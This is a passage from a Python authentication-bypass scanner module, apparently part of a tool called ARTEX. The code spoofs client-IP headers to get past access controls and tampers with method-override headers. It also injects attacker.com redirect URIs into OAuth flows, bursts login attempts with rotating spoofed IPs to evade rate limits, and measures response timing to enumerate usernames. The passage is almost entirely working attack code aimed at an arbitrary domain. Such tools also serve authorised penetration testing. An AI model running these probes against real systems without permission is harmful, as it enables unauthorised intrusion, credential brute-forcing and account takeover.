        {"X-Forwarded-Host":         "localhost"},
        {"True-Client-IP":           "127.0.0.1"},
        {"Forwarded":                "for=127.0.0.1;by=127.0.0.1"},
    ]

    _METHOD_OVERRIDES: List[str] = ["DELETE", "PUT", "PATCH", "TRACE", "CONNECT"]

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(self, target: AuthTarget) -> List[AuthFinding]:
        findings: List[AuthFinding] = []

        baseline = self._http.get(target.url)
        if not baseline:
            return findings
        baseline_code = baseline.status_code
        baseline_len  = len(baseline.text)

        # IP spoof headers
        for hdr_set in self._SPOOF_HEADERS:
            resp = self._http.get(target.url, headers=hdr_set)
            if not resp:
                continue
            if self._is_bypass(resp, baseline_code, baseline_len):
                findings.append(AuthFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = BypassTechnique.HEADER_SPOOF,
                    severity     = FindingSeverity.HIGH,
                    status       = FindingStatus.CONFIRMED,
                    target_url   = target.url,
                    evidence     = {
                        "header":       hdr_set,
                        "response_code": resp.status_code,
                        "baseline_code": baseline_code,
                    },
                    payload_used = str(hdr_set),
                    notes        = f"IP spoof header {list(hdr_set.keys())[0]!r} bypassed access control.",
                ))

        # HTTP method override
        for method in self._METHOD_OVERRIDES:
            resp = self._http.get(
                target.url,
                headers={"X-HTTP-Method-Override": method, "X-Method-Override": method},
            )
            if resp and resp.status_code not in (405, 501, 404, baseline_code):
                findings.append(AuthFinding(
                    finding_id   = str(uuid.uuid4()),
                    technique    = BypassTechnique.HTTP_METHOD_TAMPER,
                    severity     = FindingSeverity.MEDIUM,
                    status       = FindingStatus.LIKELY,
                    target_url   = target.url,
                    evidence     = {
                        "override_method": method,
                        "response_code":   resp.status_code,
                    },
                    payload_used = f"X-HTTP-Method-Override: {method}",
                    notes        = f"Method override to {method} returned unexpected status {resp.status_code}.",
                ))

        return findings

    @staticmethod
    def _is_bypass(resp: Response, baseline_code: int, baseline_len: int) -> bool:
        # 403→200 or 401→200 pattern
        if baseline_code in (401, 403) and resp.status_code == 200:
            return True
        # significant body size change on same status
        if resp.status_code == baseline_code:
            delta = abs(len(resp.text) - baseline_len)
            if delta > 500 and baseline_len < 5000:
                return True
        return False


class _OAuthProbe:
    """
    OAuth 2.0 flow attack surface:
     - open redirect in redirect_uri parameter
     - missing state parameter (CSRF on OAuth callback)
     - token leak via Referrer header on auth code exchange endpoint
    """

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(self, target: AuthTarget) -> List[AuthFinding]:
        if target.login_type != "oauth" and not target.oauth_params:
            return []
        findings: List[AuthFinding] = []
        findings.extend(self._test_open_redirect(target))
        findings.extend(self._test_state_csrf(target))
        findings.extend(self._test_token_referrer_leak(target))
        return findings

    def _test_open_redirect(self, target: AuthTarget) -> List[AuthFinding]:
        """Inject attacker.com as redirect_uri."""
        parsed = urlparse(target.url)
        qs     = target.oauth_params.copy()
        if "redirect_uri" not in qs:
            return []
        original_uri = qs["redirect_uri"]
        for evil in (
            "https://attacker.com",
            "https://attacker.com/callback",
            f"https://attacker.com/{parsed.netloc}",
            f"https://{parsed.netloc}.attacker.com",
        ):
            qs["redirect_uri"] = evil
            url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(qs)}"
            resp = self._http.get(url, allow_redirects=False)
            if resp and resp.status_code in (301, 302, 307, 308):
                loc = resp.headers.get("Location", "")
                if "attacker.com" in loc:
                    return [AuthFinding(
                        finding_id   = str(uuid.uuid4()),
                        technique    = BypassTechnique.OAUTH_REDIRECT,
                        severity     = FindingSeverity.HIGH,
                        status       = FindingStatus.CONFIRMED,
                        target_url   = url,
                        evidence     = {"injected_uri": evil, "location": loc},
                        payload_used = url,
                        notes        = "OAuth redirect_uri accepted attacker.com — auth code redirect possible.",
                    )]
        return []

    def _test_state_csrf(self, target: AuthTarget) -> List[AuthFinding]:
        qs = target.oauth_params
        if "state" not in qs or not qs["state"]:
            return [AuthFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = BypassTechnique.OAUTH_STATE_CSRF,
                severity     = FindingSeverity.MEDIUM,
                status       = FindingStatus.CONFIRMED if "state" not in qs else FindingStatus.LIKELY,
                target_url   = target.url,
                evidence     = {"oauth_params": qs, "state_present": "state" in qs},
                payload_used = None,
                notes        = "OAuth state parameter absent or empty — CSRF on auth callback possible.",
            )]
        return []

    def _test_token_referrer_leak(self, target: AuthTarget) -> List[AuthFinding]:
        """
        If callback URL contains code= or token= in query string, a Referer
        header on the next request would leak the code to a third-party resource.
        """
        parsed = urlparse(target.url)
        qs_raw = parsed.query
        if "code=" in qs_raw or "token=" in qs_raw or "access_token=" in qs_raw:
            return [AuthFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = BypassTechnique.TOKEN_LEAK_REFERRER,
                severity     = FindingSeverity.MEDIUM,
                status       = FindingStatus.POSSIBLE,
                target_url   = target.url,
                evidence     = {"query_string": qs_raw},
                payload_used = None,
                notes        = (
                    "OAuth token/code visible in URL query string. "
                    "Any embedded resource loaded by the callback page will receive "
                    "this in its Referer header."
                ),
            )]
        return []


class _RateLimitProbe:
    """
    Detects missing / bypassable rate limits on auth endpoints.
    Uses header rotation (X-Forwarded-For, true-client-ip) to simulate
    request-per-IP bypass. Also probes for user enumeration via timing difference.
    """

    _BURST_COUNT:  int   = 15
    _BURST_DELAY:  float = 0.1
    _TIMING_PROBES: int  = 8

    def __init__(self, http: _SessionPool):
        self._http = http

    def probe(self, target: AuthTarget) -> List[AuthFinding]:
        findings: List[AuthFinding] = []
        findings.extend(self._test_rate_limit(target))
        findings.extend(self._test_user_enum_timing(target))
        return findings

    def _test_rate_limit(self, target: AuthTarget) -> List[AuthFinding]:
        if not target.form_action:
            return []

        statuses: List[int] = []
        spoofed_ips = [f"10.0.0.{i}" for i in range(1, self._BURST_COUNT + 1)]

        for fake_ip in spoofed_ips:
            resp = self._http.post(
                target.form_action,
                data={
                    target.user_field  or "username": "admin",
                    target.pass_field  or "password": "wrongpass",
                    **(target.extra_fields or {}),
                },
                headers={
                    "X-Forwarded-For": fake_ip,
                    "X-Real-IP":       fake_ip,
                    "True-Client-IP":  fake_ip,
                },
                cookies=target.cookies,
            )
            statuses.append(resp.status_code if resp else 0)
            time.sleep(self._BURST_DELAY)

        block_codes = sum(1 for s in statuses if s in (429, 403, 503))
        if block_codes == 0:
            return [AuthFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = BypassTechnique.RATE_LIMIT_BYPASS,
                severity     = FindingSeverity.HIGH,
                status       = FindingStatus.CONFIRMED,
                target_url   = target.form_action,
                evidence     = {
                    "burst_count":  self._BURST_COUNT,
                    "statuses":     statuses,
                    "blocks_seen":  block_codes,
                },
                payload_used = f"X-Forwarded-For: 10.0.0.1..{self._BURST_COUNT}",
                notes        = (
                    f"No rate-limit triggered after {self._BURST_COUNT} rapid POST requests "
                    f"with rotating X-Forwarded-For. Bruteforce surface open."
                ),
            )]

        return []

    def _test_user_enum_timing(self, target: AuthTarget) -> List[AuthFinding]:
        """
        Timing oracle: valid user vs invalid user should respond in the same
        time if resistant to enumeration.
        """
        if not target.form_action:
            return []

        def measure(username: str, n: int = self._TIMING_PROBES) -> float:
            times: List[float] = []
            for _ in range(n):
                t0   = time.perf_counter()
                self._http.post(
                    target.form_action,
                    data={
                        target.user_field or "username": username,
                        target.pass_field or "password": "wrongpass_xyzzy",
                        **(target.extra_fields or {}),
                    },
                    cookies=target.cookies,
                )
                times.append(time.perf_counter() - t0)
                time.sleep(0.15)
            times.sort()
            return sum(times[1:-1]) / max(len(times) - 2, 1)  # trimmed mean

        t_existing = measure("admin")
        t_missing  = measure(f"no_such_user_{uuid.uuid4().hex[:8]}")
        delta      = abs(t_existing - t_missing)

        if delta > 0.15:
            faster  = "valid user" if t_existing < t_missing else "invalid user"
            return [AuthFinding(
                finding_id   = str(uuid.uuid4()),
                technique    = BypassTechnique.USER_ENUM_TIMING,
                severity     = FindingSeverity.MEDIUM,
                status       = FindingStatus.LIKELY,
                target_url   = target.form_action,
                evidence     = {
                    "t_existing_user_ms": round(t_existing * 1000, 1),
                    "t_missing_user_ms":  round(t_missing  * 1000, 1),
                    "delta_ms":           round(delta       * 1000, 1),
                    "faster_response":    faster,
                },
                payload_used = None,
                notes        = (
                    f"Timing delta {delta*1000:.0f}ms between existing/missing usernames — "
                    f"user enumeration via timing oracle."
                ),
            )]

        return []


# ─────────────────────────────────────────────────────────────────────────────
# Scorer
# ─────────────────────────────────────────────────────────────────────────────

class _BypassScorer:
    def score(self, findings: List[AuthFinding]) -> Tuple[float, str]:
        if not findings:
            return 0.0, "INFO"

        confirmed_weight = {
            FindingStatus.CONFIRMED: 1.0,
            FindingStatus.LIKELY:    0.7,
            FindingStatus.POSSIBLE:  0.4,
            FindingStatus.NOT_VULN:  0.0,
            FindingStatus.ERROR:     0.0,
        }
        raw = sum(
            f.severity.value * confirmed_weight.get(f.status, 0.0)
            for f in findings
        )
        max_possible = len(findings) * FindingSeverity.CRITICAL.value
        score = min(100.0, (raw / max_possible) * 100) if max_possible else 0.0

        label = (
            "CRITICAL" if score >= 80 else
            "HIGH"     if score >= 60 else
            "MEDIUM"   if score >= 40 else
            "LOW"      if score >= 20 else
            "INFO"
        )
        return score, label


# ─────────────────────────────────────────────────────────────────────────────
# Orchestrator — public API consumed by app.py
# ─────────────────────────────────────────────────────────────────────────────

class AuthBypass:
    """
    Drop-in ARTEX module.

    Usage in app.py (run_scan), after tech_detection + payload_analysis:

        from core.auth_bypass import AuthBypass

        ab = AuthBypass()
        scan_results[scan_id]['auth_bypass'] = ab.run(
            domain=domain,
            scan_results=scan_results[scan_id],
        )
    """

    def __init__(
        self,
        request_delay:   float = 0.5,
        timeout:         float = 8.0,
        on_finding:      Optional[Callable[[AuthFinding], None]] = None,
    ):
        self._http       = _SessionPool(request_delay=request_delay, timeout=timeout)
        self._on_finding = on_finding
        self._scorer     = _BypassScorer()

    # ── entry point ───────────────────────────────────────────────────────

    def run(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> Dict[str, Any]:
        run_id     = str(uuid.uuid4())
        started_at = datetime.now()
        logger.info("AuthBypass %s starting for %s", run_id, domain)

        # 1. discover auth surfaces from existing scan data
        discoverer = AuthSurfaceDiscoverer(self._http)
        targets    = discoverer.discover(scan_results)
        logger.info("Found %d auth targets", len(targets))

        if not targets:
            return self._empty_result(run_id, domain, started_at)

        # 2. run technique modules against each target (threaded per target)
        all_findings: List[AuthFinding] = []
        lock = threading.Lock()

        def probe_target(target: AuthTarget) -> None:
            target_findings: List[AuthFinding] = []

            target_findings.extend(_SQLiLoginProbe(self._http).probe(target))
            target_findings.extend(_SessionAttackProbe(self._http).probe(target))
            target_findings.extend(_HeaderSpoofProbe(self._http).probe(target))
            target_findings.extend(_OAuthProbe(self._http).probe(target))
            target_findings.extend(_RateLimitProbe(self._http).probe(target))

            with lock:
                all_findings.extend(target_findings)

            if self._on_finding:
                for f in target_findings:
                    try:
                        self._on_finding(f)
                    except Exception:
                        pass

        threads = [threading.Thread(target=probe_target, args=(t,)) for t in targets]
        for th in threads:
            th.start()
        for th in threads:
            th.join()

        # 3. JWT analysis — cross-target, reads scan_results directly
        jwt_findings = _JWTAnalyzer(self._http).analyze(scan_results, targets)
        all_findings.extend(jwt_findings)

        # 4. score
        score, risk_level = self._scorer.score(all_findings)

        techniques_tested = sorted({f.technique.value for f in all_findings})

        finished_at = datetime.now()

        result = BypassResult(
            run_id            = run_id,
            domain            = domain,
            targets           = [t.to_dict() for t in targets],
            findings          = [f.to_dict() for f in all_findings],
            score             = score,
            risk_level        = risk_level,
            techniques_tested = techniques_tested,
            started_at        = started_at,
            finished_at       = finished_at,
        )

        logger.info(
            "AuthBypass %s done — score=%.1f risk=%s findings=%d",
            run_id, score, risk_level, len(all_findings),
        )

        return result.to_dict()

    # ── helpers ───────────────────────────────────────────────────────────

    @staticmethod
    def _empty_result(run_id: str, domain: str, started_at: datetime) -> Dict[str, Any]:
        now = datetime.now()
        return {
            "run_id":            run_id,
            "domain":            domain,
            "targets_found":     0,
            "targets":           [],
            "findings":          [],
            "score":             0.0,
            "risk_level":        "INFO",
            "techniques_tested": [],
            "started_at":        started_at.isoformat(),
            "finished_at":       now.isoformat(),
            "duration_s":        round((now - started_at).total_seconds(), 3),
        }